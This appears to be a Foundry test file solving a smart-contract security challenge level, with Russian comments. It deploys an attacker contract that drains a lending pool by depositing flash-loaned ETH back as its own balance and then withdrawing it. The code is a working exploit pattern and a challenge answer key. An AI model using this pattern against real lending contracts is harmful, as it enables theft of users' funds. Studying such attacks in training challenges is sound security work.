// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/08_LendingPool/LendingPool.sol";

// forge test --match-contract ExploitLendingPoolTest -vvvv
contract ExploitLendingPoolTest is BaseTest {
    LendingPool pool; // Целевой контракт

    function setUp() public override {
        super.setUp();
        // Создаём контракт LendingPool с начальным балансом 0.1 ETH
        pool = new LendingPool{value: 0.1 ether}();

        // Устанавливаем блок для стабильности тестов
        vm.roll(1000);
    }

    function testExploit() public {
        uint256 poolBalance = address(pool).balance; // Баланс пула

        // Развёртываем атакующий контракт
        PoolAttacker attacker = new PoolAttacker(address(pool), poolBalance);

        // Инициируем флэш-кредит для атаки
        attacker.launchAttack();

            checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(pool).balance == 0, "Solution is not solving the level");
    }
}

contract PoolAttacker is IFlashLoanReceiver {
    LendingPool public targetPool; // Адрес целевого контракта
    uint256 public attackAmount; // Сумма атаки

    constructor(address _targetPool, uint256 _attackAmount) {
        targetPool = LendingPool(_targetPool);
        attackAmount = _attackAmount;
    }

    // Запуск атаки через флэш-кредит
    function launchAttack() external {
        targetPool.flashLoan(attackAmount);
        targetPool.withdraw();
    }

    // Логика выполнения флэш-кредита
    function execute() external payable override {
        // Депозитируем средства обратно в пул
        targetPool.deposit{value: attackAmount}();
    }

    // Приём эфира от пула
    receive() external payable {}
}
